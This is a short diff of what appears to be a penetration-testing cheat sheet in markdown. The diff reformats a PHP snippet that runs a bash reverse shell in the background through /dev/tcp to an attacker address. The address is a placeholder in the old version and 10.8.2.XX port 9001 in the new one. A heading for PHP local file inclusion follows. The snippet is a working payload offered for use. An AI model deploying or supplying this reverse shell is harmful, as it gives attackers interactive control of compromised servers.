@@ -108,17 +108,19 @@ email_re = re.compile(r'([a-zA-Z0-9_\+\-\.]+)@(([[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1
 
 ```php
 
-function execInBackground($cmd) { 
-                if (substr(php_uname(), 0, 7) == "Windows"){ 
-                                    pclose(popen("start /B ". $cmd, "r"));  
-                                                    } 
-                                                                    else { 
-                                                                                        exec($cmd . " > /dev/null &");   
-                                                                                                            } 
-                                                                                                                            } 
-                                                                                                                                        execInBackground("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_HERE/YOUR_PORT_HERE 0>&1'");
+<?php 
+
+function execInBackground($cmd) {
+    if (substr(php_uname(), 0, 7) == "Windows") {
+            pclose(popen("start /B ". $cmd, "r"));
+    }else{ 
+      exec($cmd . " > /dev/null &");}}
+    execInBackground("/bin/bash -c 'bash -i >& /dev/tcp/10.8.2.XX/9001 0>&1'");
+?>
 
 ```
+
+
 # PHP LFI
 
 ```bash
